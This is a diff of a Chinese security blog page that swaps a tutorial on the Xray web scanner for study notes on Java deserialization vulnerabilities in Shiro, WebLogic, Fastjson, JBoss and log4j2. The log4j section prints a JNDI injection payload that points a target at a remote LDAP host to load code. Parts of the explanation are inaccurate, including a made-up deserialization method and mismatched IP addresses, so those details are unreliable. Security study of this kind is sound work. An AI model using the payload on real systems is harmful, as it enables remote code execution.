@@ -16,32 +16,25 @@
   <meta name="author" content="SCxiaoyun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="¶配置： Xray的配置相对来说比较友好，没有那么痛苦 使用--config 用于指定配置文件的位置，默认加载同目录的 config.yaml。 –h 查看帮助 ¶命令：    命令 说明     webscan xray核心功能，用来发现探测Web漏洞   servicescan 服务扫描功能 用来探测服务漏洞   poclint 检测poc是否符合规范   reverse 启动单独的盲打平台服">
+    <meta name="description" content="¶java序列化与反序列化 1、概述 两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。 java是面向对象的开发方式，一切都是java对象，想要在网络中传输java对象，可以使用序列化和反序列化去实现，发送发需要将java对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成java对象。 序列化">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Xray的基本使用">
-<meta property="og:url" content="https://jsweetcoffee.github.io/posts/8487c21c.html">
+<meta property="og:title" content="java反序列化全家桶">
+<meta property="og:url" content="https://jsweetcoffee.github.io/posts/a840fd.html">
 <meta property="og:site_name" content="晓雲的陋室">
-<meta property="og:description" content="¶配置： Xray的配置相对来说比较友好，没有那么痛苦 使用--config 用于指定配置文件的位置，默认加载同目录的 config.yaml。 –h 查看帮助 ¶命令：    命令 说明     webscan xray核心功能，用来发现探测Web漏洞   servicescan 服务扫描功能 用来探测服务漏洞   poclint 检测poc是否符合规范   reverse 启动单独的盲打平台服">
+<meta property="og:description" content="¶java序列化与反序列化 1、概述 两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。 java是面向对象的开发方式，一切都是java对象，想要在网络中传输java对象，可以使用序列化和反序列化去实现，发送发需要将java对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成java对象。 序列化">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640526186117-d2910b64-38ca-47f1-bfa0-fb47ab1cf9ad.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640526284826-313b79c2-8daa-4dce-8abb-3cf801f7b1e1.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640526732164-872d52a7-7713-486b-bf54-eda276a85a76.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2336202/1640526926018-df7c1cdb-9e2f-4e76-8f6b-38bbe1be94ef.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640527039148-c92635d7-a2a3-4ef5-a7be-45fa3c64ddfd.png">
-<meta property="og:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640527162668-39dca769-d52f-4763-9665-0ec08fb101ba.png">
-<meta property="article:published_time" content="2023-08-17T07:45:24.000Z">
-<meta property="article:modified_time" content="2023-09-06T08:54:56.839Z">
+<meta property="article:published_time" content="2023-09-15T01:58:29.000Z">
+<meta property="article:modified_time" content="2023-09-18T00:06:51.368Z">
 <meta property="article:author" content="SCxiaoyun">
-<meta property="article:tag" content="工具">
-<meta property="article:tag" content="漏洞扫描">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="web安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://jsweetcoffee.github.io/posts/8487c21c/1640526186117-d2910b64-38ca-47f1-bfa0-fb47ab1cf9ad.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Xray的基本使用 - 晓雲的陋室</title>
+  <title>java反序列化全家桶 - 晓雲的陋室</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -239,7 +232,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Xray的基本使用"></span>
+            <span id="subtitle" data-typed-text="java反序列化全家桶"></span>
           
         </div>
 
@@ -255,8 +248,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-17 15:45" pubdate>
-          2023年8月17日 下午
+        <time datetime="2023-09-15 09:58" pubdate>
+          2023年9月15日 上午
         </time>
       </span>
     
@@ -267,7 +260,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          5.6k 字
         
       </span>
     
@@ -278,7 +271,7 @@
         
         
         
-          22 分钟
+          47 分钟
         
       </span>
     
@@ -324,12 +317,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Xray的基本使用</h1>
+            <h1 style="display: none">java反序列化全家桶</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年9月6日 下午
+                    本文最后更新于：2023年9月18日 早上
                   
                 
               </p>
@@ -337,125 +330,137 @@
             
               <div class="markdown-body">
                 
-                <h2 id="配置："><a class="header-anchor" href="#配置：">¶</a>配置：</h2>
-<p>Xray的配置相对来说比较友好，没有那么痛苦</p>
-<p>使用<code>--config</code> 用于指定配置文件的位置，默认加载同目录的 config.yaml。</p>
-<p>–h 查看帮助</p>
-<h2 id="命令："><a class="header-anchor" href="#命令：">¶</a>命令：</h2>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>webscan</td>
-<td>xray核心功能，用来发现探测Web漏洞</td>
-</tr>
-<tr>
-<td>servicescan</td>
-<td>服务扫描功能 用来探测服务漏洞</td>
-</tr>
-<tr>
-<td>poclint</td>
-<td>检测poc是否符合规范</td>
-</tr>
-<tr>
-<td>reverse</td>
-<td>启动单独的盲打平台服务</td>
-</tr>
-<tr>
-<td>genca</td>
-<td>用于快速生成一个根证书，主要用于被动代理扫描HTTPS流量时用到</td>
-</tr>
-<tr>
-<td>upgrade</td>
-<td>检查新版本并自动升级</td>
-</tr>
-<tr>
-<td>version</td>
-<td>版本信息</td>
-</tr>
-<tr>
-<td>help</td>
-<td>显示命令列表或一个命令的帮助</td>
-</tr>
-<tr>
-<td>subdomain</td>
-<td>子域名扫描 高级本才有的命令</td>
-</tr>
-</tbody>
-</table>
-<h3 id="生成ca证书"><a class="header-anchor" href="#生成ca证书">¶</a>生成ca证书</h3>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.\xray.exe <span class="hljs-keyword">ge</span><span class="hljs-symbol">nca</span><br></code></pre></td></tr></table></figure>
-<p>会生成ca.key，ca.crt两个文件</p>
-<h3 id="webscan"><a class="header-anchor" href="#webscan">¶</a><strong>webscan</strong></h3>
-<p>在webscan后跟 <code>-h</code>查看webscan帮助</p>
-<ol>
-<li><strong>直接调用，扫描一个指定站点</strong></li>
-</ol>
-<p>./xray_windows_amd64.exe webscan --basic-crawler <a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a></p>
-<ol start="2">
-<li><strong>指定扫描输出</strong></li>
-</ol>
-<p>不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：</p>
-<pre><code class="hljs">./xray_windows_amd64.exe webscan --url http://example.com/ --json-output report.json
+                <h2 id="java序列化与反序列化"><a class="header-anchor" href="#java序列化与反序列化">¶</a>java序列化与反序列化</h2>
+<p>1、概述</p>
+<p>两个进程在远程通信时，可以发送多种数据，包括文本、图片、音频、视频等，这些数据都是以二进制序列的形式在网络上传输。</p>
+<p>java是面向对象的开发方式，一切都是java对象，想要在网络中传输java对象，可以使用序列化和反序列化去实现，发送发需要将java对象转换为字节序列，然后在网络上传送，接收方收到字符序列后，会通过反序列化将字节序列恢复成java对象。</p>
+<p>序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</p>
+<p>Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，<strong>ObjectOutputStream类的writeObject()方法可以实现序列化</strong>。反序列化是指把字节序列恢复为 Java 对象的过程，<strong>ObjectInputStream 类的 readObject() 方法用于反序列化。</strong></p>
+<blockquote>
+<p>1.JDK类库提供的序列化API:</p>
+<p>java.io.ObjectOutputStream<br>
+表示对象输出流，其中writeObject(Object obj)方法可以将给定参数的obj对象进行序列化，将转换的一连串的字节序列写到指定的目标输出流中。<br>
+java.io.ObjectInputStream<br>
+该类表示对象输入流，该类下的readObject(Object obj)方法会从源输入流中读取字节序列，并将它反序列化为一个java对象并返回。</p>
+</blockquote>
+<p>2、什么是序列化和反序列化</p>
+<p>Java序列化就是指把Java对象转换为字节序列的过程</p>
+<p>Java反序列化就是指把字节序列恢复为Java对象的过程。</p>
+<p>在序列化和反序列化中很重要的两个方法<strong>writeObject和readObject</strong>，这两个方法可以经过开发者的重写，一般开发者们会根据自己的需求来进行重写，然而只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p>
+<p>在反序列化的时候<code>readObject</code>中代码会自动执行，如果<code>readObject</code>插入命令执行的代码，也就执行，就产生了安全漏洞。</p>
+<pre><code class="hljs">所以从根本上来说，Java 反序列化的漏洞的与readObject有关。
 </code></pre>
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">无参数：输出到控制台的标准输出 <br><br>--`text-output`：输出到文本文件中 <br><br>--`json-output`：输出到 JSON 文件中 <br><br>--`html-output`：输出到 HTML 文件中<br></code></pre></td></tr></table></figure>
-<ol start="3">
-<li><strong>抓包扫描</strong></li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./xray_windows_amd64.exe webscan <span class="hljs-literal">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure>
-<p>很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的ca.crt证书</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\xray_windows_amd64.exe genca<br>ca.crt ca.key config.yaml xray<br></code></pre></td></tr></table></figure>
-<p>导入证书和bp一样（如果你不知道bp是什么，那建议先去了解bp）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">./xray_windows_amd64.exe webscan <span class="hljs-literal">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure>
-<ol start="4">
-<li><strong>xray 与 Burpsuite 联动</strong></li>
-</ol>
-<p>首先 xray 建立起 webscan 的监听:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./xray.exe webscan --listen 127.0.0.1:7777 --html-output bp.html<br></code></pre></td></tr></table></figure>
-<p>进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。</p>
-<p>点击 Add 添加上游代理以及作用域，Destination host处可以使用*匹配多个任意字符串，?匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。</p>
-<img src="/posts/8487c21c/1640526186117-d2910b64-38ca-47f1-bfa0-fb47ab1cf9ad.png" class title="img">
-<p>接下来 BP 正常抓包，与此同时 BP 也会将我们截取到的一些流量包发到 xray 中进行漏洞检测。</p>
-<img src="/posts/8487c21c/1640526284826-313b79c2-8daa-4dce-8abb-3cf801f7b1e1.png" class title="img">
-<ol start="4">
-<li>
-<h3 id="xray-与-AWVS-联动"><a class="header-anchor" href="#xray-与-AWVS-联动">¶</a>xray 与 AWVS 联动</h3>
-<p>首先 xray 建立起 webscan 的监听：</p>
-<p>如果你的AWVS不是安装在物理机上话，那么你的xray应该填写你AWVS可以访问的地址；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">./xray.exe webscan --listen 192.168.1.105:7777 --html-output awvs.html   //本机ip，不要填127.0.0.1<br></code></pre></td></tr></table></figure>
-<p>登入管理页后，点击 Targets, 然后点击 Add Target 添加扫描目标：</p>
-<p>测试靶场：<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a></p>
-<img src="/posts/8487c21c/1640526732164-872d52a7-7713-486b-bf54-eda276a85a76.png" class title="img">
-<p>下滑到HTTP部分，填写Proxy Server为对应的xray代理：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1640526926018-df7c1cdb-9e2f-4e76-8f6b-38bbe1be94ef.png" alt="img"></p>
-<p>扫描类型，仅爬取：</p>
-<img src="/posts/8487c21c/1640527039148-c92635d7-a2a3-4ef5-a7be-45fa3c64ddfd.png" class title="img">
-<p>此时 AWVS 的爬虫会把请求都转发给 xray 检测漏洞了，此时awvs.html里面就躺好了漏洞：</p>
-<img src="/posts/8487c21c/1640527162668-39dca769-d52f-4763-9665-0ec08fb101ba.png" class title="img">
-</li>
-<li>
-<p><strong>指定扫描插件</strong></p>
-</li>
-</ol>
-<p>使用 --plugins 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：</p>
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./xray_windows_amd64.exe</span> webscan <span class="hljs-params">--plugins</span> cmd_injection <span class="hljs-params">--url</span> http:<span class="hljs-string">//example.com/</span><br></code></pre></td></tr></table></figure>
-<p>插件支持和key:</p>
-<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">SQL</span> 注入检测 (<span class="hljs-attribute">key</span>: sqldet)：   支持报错注入、布尔注入和时间盲注等<br><span class="hljs-selector-tag">XSS</span> 检测（<span class="hljs-selector-tag">key</span>: <span class="hljs-selector-tag">xss</span>）：         支持扫描反射型、存储型 <span class="hljs-selector-tag">XSS</span><br>命令/代码注入检测 (<span class="hljs-attribute">key</span>: cmd_injection)：     支持 <span class="hljs-selector-tag">shell</span> 命令注入、<span class="hljs-selector-tag">PHP</span> 代码执行、模板注入等<br>目录枚举 (<span class="hljs-attribute">key</span>: dirscan)：    检测备份文件、临时文件、<span class="hljs-selector-tag">debug</span> 页面、配置文件等<span class="hljs-number">10</span>余类敏感路径和文件<br>路径穿越检测 (<span class="hljs-attribute">key</span>: path_traversal)：     支持常见平台和编码<br><span class="hljs-selector-tag">XML</span> 实体注入检测 (<span class="hljs-attribute">key</span>: xxe)：    支持有回显和反连平台检测<br><span class="hljs-selector-tag">POC</span> 管理 (<span class="hljs-attribute">key</span>: phantasm)：    默认内置部分常用的 <span class="hljs-selector-tag">POC</span>，用户可以根据需要自行构建 <span class="hljs-selector-tag">POC</span> 并运行。可参考：<span class="hljs-selector-tag">POC</span> 编写文档（<span class="hljs-selector-tag">https</span>:<span class="hljs-comment">//chaitin.github.io/xray/#/guide/poc）</span><br>文件上传检测 (<span class="hljs-attribute">key</span>: upload)：    支持检测常见的后端服务器语言的上传漏洞<br>弱口令检测 (<span class="hljs-attribute">key</span>: brute_force)：    支持检测 <span class="hljs-selector-tag">HTTP</span> 基础认证和简易表单弱口令，内置常见用户名和密码字典<br><span class="hljs-selector-tag">JSONP</span> 检测 (<span class="hljs-attribute">key</span>: jsonp)：    检测包含敏感信息可以被跨域读取的 <span class="hljs-selector-tag">jsonp</span> 接口<br><span class="hljs-selector-tag">SSRF</span> 检测 (<span class="hljs-attribute">key</span>: ssrf)：    <span class="hljs-selector-tag">ssrf</span> 检测模块，支持常见的绕过技术和反连平台检测<br>基线检查 (<span class="hljs-attribute">key</span>: baseline)：    检测低 <span class="hljs-selector-tag">SSL</span> 版本、缺失的或错误添加的 <span class="hljs-selector-tag">http</span> 头等<br>任意跳转检测 (<span class="hljs-attribute">key</span>: redirect)：    支持 <span class="hljs-selector-tag">HTML</span> <span class="hljs-selector-tag">meta</span> 跳转、<span class="hljs-number">30</span><span class="hljs-selector-tag">x</span> 跳转等<br><span class="hljs-selector-tag">CRLF</span> 注入 (<span class="hljs-attribute">key</span>: crlf_injection)：    检测 <span class="hljs-selector-tag">HTTP</span> 头注入，支持 <span class="hljs-selector-tag">query</span>、<span class="hljs-selector-tag">body</span> 等位置的参数<br></code></pre></td></tr></table></figure>
-<ol start="5">
-<li><strong>自定义 POC</strong></li>
-</ol>
-<p>xray 支持用户使用 YAML 编写 POC。YAML 是 JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">YAML</span> 格式的 “值” 无需使用双引号包裹，特殊字符无需转义<br>YAML 格式使内容更加可读<br>YAML 中可以使用注释<br></code></pre></td></tr></table></figure>
-<ol start="6">
-<li><strong>反连平台</strong></li>
-</ol>
-<p>xray 在运行时会自动启动反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。</p>
-<p>dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址。</p>
+<h2 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h2>
+<p>共同条件继承Serializable<br>
+入口类source(重写readObject参数类型宽泛最好jdk自带)调用链gadget chain<br>
+执行类sink(rce ssf 写文件等等)</p>
+<h1>shiro</h1>
+<blockquote>
+<p>Shiro是一个强大的简单易用的Java安全框架，主要用来更便捷的认证，授权，加密，会话管理。Shiro首要的和最重要的目标就是容易使用并且容易理解。</p>
+</blockquote>
+<h3 id="shiro的身份认证工作流程"><a class="header-anchor" href="#shiro的身份认证工作流程">¶</a>shiro的身份认证工作流程</h3>
+<pre><code class="hljs">通过前端传入的值，
+获取rememberMe cookie
+base64加密
+AES加密 （对称加解密）
+反序列化
+</code></pre>
+<h3 id="shiro反序列化漏洞原理"><a class="header-anchor" href="#shiro反序列化漏洞原理">¶</a>shiro反序列化漏洞原理</h3>
+<p>​		AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
+<p><strong>流程</strong></p>
+<p>得到rememberMe的cookie值 --&gt; Base64解码 --&gt; AES解密 --&gt; 反序列化</p>
+<p><strong>什么是硬编码：</strong><br>
+硬编码要求程序的源代码在输入数据或所需格式发生变化时进行更改，以便最终用户可以通过程序外的某种方式更改细节。</p>
+<h3 id="shiro的特征："><a class="header-anchor" href="#shiro的特征：">¶</a>shiro的特征：</h3>
+<pre><code class="hljs">未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段
+
+登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe=deleteMe字段
+
+不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段
+
+勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe=deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段
+</code></pre>
+<h1>weblogic</h1>
+<p>详细原理参考文章：<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv17256282/">https://www.bilibili.com/read/cv17256282/</a></p>
+<p><strong>用途</strong>：用于解析java，部署<strong>大型分布式</strong>Web应用的Web中间件</p>
+<h3 id="XMLDecoder反序列化漏洞"><a class="header-anchor" href="#XMLDecoder反序列化漏洞">¶</a>XMLDecoder反序列化漏洞</h3>
+<p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XM（SOAP协议）数据，在解析的过程中出现反序列化漏洞，导致任意代码执行。出问题的包是wls-wsat、_async。</p>
+<h3 id="T3协议反序列化漏洞"><a class="header-anchor" href="#T3协议反序列化漏洞">¶</a>T3协议反序列化漏洞</h3>
+<p>​		开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，利用RMI绕过weblogic的黑名单限制，通过readObject解析加载的内容，获取目标服务器权限。</p>
+<p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p>
+<pre><code class="hljs">T3协议：
+用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。
+
+RMI：
+远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）
+</code></pre>
+<h1>Fastjson</h1>
+<h3 id="什么是Fastjson"><a class="header-anchor" href="#什么是Fastjson">¶</a><strong>什么是Fastjson?</strong></h3>
+<p>fastjson介绍：fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。FastJson是啊里巴巴的的开源库，用与对JSON格式的数据进行解析和打包。</p>
+<p>fastjson在解析json过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类com.sun.org.apache.xalan.internal.xsltc.trax.Templateslmpl中有一个私有属性 _bytecodes，其部分方法会执行这个值中包含的Java字节码。、</p>
+<h3 id="指纹特征"><a class="header-anchor" href="#指纹特征">¶</a>指纹特征</h3>
+<h5 id="有回显"><a class="header-anchor" href="#有回显">¶</a>有回显</h5>
+<p>通过构造错误的POST请求体，服务器返回报错中查看是否存在fastjson字样</p>
+<p><strong>无回显</strong></p>
+<p><strong>方法一：通过DOS延迟方式</strong></p>
+<p>fastjson在版本&lt;1.2.60在取不到值的时候会填充\u001a，发生DOS，我们可以构造请求，通过响应延迟来判断是否使用的fastjson</p>
+<p><strong>方法二：通过DNS回显方式</strong></p>
+<p>通过DNS回显的方式检测后端是否使用的fastjson</p>
+<h5 id="小技巧"><a class="header-anchor" href="#小技巧">¶</a>小技巧</h5>
+<p><strong>如何判断使用的Fastjson还是Jackson?</strong><br>
+Jackson相对比较严格，强制key和javabean属性对齐，只能少不能多key</p>
+<h3 id="Fastjson反序列化漏洞"><a class="header-anchor" href="#Fastjson反序列化漏洞">¶</a>Fastjson反序列化漏洞</h3>
+<pre><code class="hljs">Fastjson在序列化的时候，会调用成员变量的get方法，私有成员变量不会被序列。
+Fastjson在反序列化的时候，会调用成员变量的set方法，public修饰的成员全部自动赋值。
+</code></pre>
+<p>原理：由于它在反序列一个对象的时候会去自动调用这个对象的set方法，所以如果这个set方法中有一些危险的操作，那么就会导致漏洞的产生。</p>
+<blockquote>
+<p>漏洞原理</p>
+<p>fastjson就是为了知道传入的值是水果里的苹果类型还是水果里的苹果手机类型。加了autotype机制导致的。因为他为了知道是什么详细类型，每次都需要读取下@type导致的。</p>
+<p>Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。</p>
+<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+</blockquote>
+<p>利用思路：上面说了在fastjson反序列化的时候会自动调用对象的set方法，所以我们就有了利用思路，如果我们可以找到一个类，并且这个类中有set方法，这个类的set方法中有一些敏感操作，并且每次运行任意java代码的时候又必须调用这个类，那我们就可以利用这个漏洞了。</p>
+<p>经过大佬的总结，以下这几个类就是我们上面所说的类(这些类都是jdk中的，也就是说不管你运行什么样的代码，它都会调用下面这几个类)：</p>
+<pre><code class="hljs">com.sun.rowset
+JdbcRowSetlmpl
+Templateslmpl
+com.sun.org.apache.xalan.internal.xsltc.trax
+</code></pre>
+<blockquote>
+<p>JNDI提供了 查找和访问各种命名和目录服务的通用、统一的接口。支持的服务：DNS，LDAP，RMI，CORBA等</p>
+<p>JNDI注入发生在客户端的lookup()中，如果lookup()的参数可控即可导致被攻击</p>
+</blockquote>
+<h1>Jboss</h1>
+<p>CVE-2017-12149</p>
+<p>漏洞影响5.x和6.x版本的JBOSSAS。该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。<br>
+CVE-2017-7504</p>
+<p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
+<h1>log4j2(CVE-2021-44228)</h1>
+<p>Apache Log4j 2.x &lt;= 2.14.1</p>
+<h3 id="什么是log4j2？"><a class="header-anchor" href="#什么是log4j2？">¶</a>什么是log4j2？</h3>
+<p>log4j2是java中一个流行的的日志框架，可以在服务中记录日志消息，提供了多种方式来记录和处理日志数据，使开发人员可以轻松的生成和管理大量日志信息</p>
+<h3 id="漏洞原理"><a class="header-anchor" href="#漏洞原理">¶</a>漏洞原理</h3>
+<p>由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施。</p>
+<p>导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。</p>
+<h3 id="漏洞的利用流程："><a class="header-anchor" href="#漏洞的利用流程：">¶</a>漏洞的利用流程：</h3>
+<p>1、向目标发送HTTP请求，其中请求包含了由${}字符构成的payload</p>
+<p>2、web服务接受到请求后，会将payload作为参数传入到logh4j2组件中的日志格式化方法</p>
+<p>3、log4j2在格式化日志的时候会解析payload内容，从而根据payload的JNDI协议访问了远程服务器地址</p>
+<p>4、远程服务器收到了log4j2发送的请求，返回恶意的代码</p>
+<p>5、收到了恶意的代码，并执行漏洞攻击原理</p>
+<h3 id="原理概述"><a class="header-anchor" href="#原理概述">¶</a>原理概述</h3>
+<p>​		当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中  假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp 解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找  在http中找到exp之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现exp是一个.class文件，就会去执行里面的代码，从而实现注入 攻击者就可以通过shell实现任意的命令执行，造成严重危害。</p>
+<blockquote>
+<p>JNDI：Java Naming and Directory Interface，即Java命名和目录接口。JNDI包含了一些标准API接口，Java程序可以通过这些接口来访问命名目录服务。它提供了一致的模型来存取和操作企业级的资源如DNS和LDAP。</p>
+</blockquote>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhuyi666/article/details/129466774">https://blog.csdn.net/zhuyi666/article/details/129466774</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106538764">https://blog.csdn.net/Aaron_Miller/article/details/106538764</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106657746">https://blog.csdn.net/Aaron_Miller/article/details/106657746</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/119899231">https://blog.csdn.net/rfrder/article/details/119899231</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/123880171">https://blog.csdn.net/LJH1999ZN/article/details/123880171</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/129157367">https://blog.csdn.net/qq_63928796/article/details/129157367</a></p>
 
                 
               </div>
@@ -474,7 +479,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%B7%A5%E5%85%B7/" class="category-chain-item">工具</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="category-chain-item">漏洞</a>
   
   
 
@@ -489,9 +494,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%B7%A5%E5%85%B7/">#工具</a>
